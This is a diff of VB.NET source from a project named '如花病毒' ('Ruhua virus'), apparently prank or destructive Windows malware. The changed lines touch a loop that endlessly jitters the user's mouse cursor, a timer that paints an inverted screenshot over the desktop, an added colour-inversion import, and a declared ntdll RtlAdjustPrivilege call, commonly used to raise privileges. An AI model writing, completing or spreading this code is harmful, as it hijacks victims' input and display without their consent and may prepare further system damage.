@@ -2,10 +2,10 @@
 Imports System.Drawing
 Imports System.IO
 Imports System.Media.SoundPlayer
-Imports MPR
 Imports System.Reflection
 Imports System.Collections.Generic
 Imports 如花病毒.Form2.SoundW
+Imports 反色模块
 
 Public Class Form2
     Public Declare Function RtlAdjustPrivilege Lib "ntdll" (ByVal Privilege As Long, ByVal Newvalue As Long, ByVal NewThread As Long, ByRef Oldvalue As Long) As Long
@@ -144,7 +144,7 @@ debugTag:
         Dim where As Point
         Do
             where = MousePosition '获得当前鼠标位置
-            SetCursorPos(CDbl(where.x) + 5 * (-1) ^ Int(1 + Random.Next(2)), CDbl(where.y) + 5 * (-1) ^ Int(1 + Random.Next(2))) 'Set mouse position
+            SetCursorPos(CDbl(where.X) + 5 * (-1) ^ Int(1 + Random.Next(2)), CDbl(where.Y) + 5 * (-1) ^ Int(1 + Random.Next(2))) 'Set mouse position
             Threading.Thread.Sleep(50) 'stop 50 milliseconds
         Loop
     End Sub
@@ -218,12 +218,12 @@ again:
     End Sub
 
     Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
-        Dim www As Graphics = Graphics.FromHdc(APIClass.GetWindowDC(APIClass.GetDesktopWindow))
+        Dim www As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow))
         Dim scr As Screen = Screen.PrimaryScreen
         Dim temp1 As New Bitmap(scr.WorkingArea.Width, scr.WorkingArea.Height)
         Dim ww As Graphics = Graphics.FromImage(temp1)
         ww.CopyFromScreen(New Point, New Point, scr.WorkingArea.Size)
-        Dim handle As IntPtr = Class2.PContray(temp1).GetHicon
+        Dim handle As IntPtr = Class1.PContray(temp1).GetHicon
         www.DrawIcon(Icon.FromHandle(handle), scr.WorkingArea)
     End Sub
     Sub Icoc()
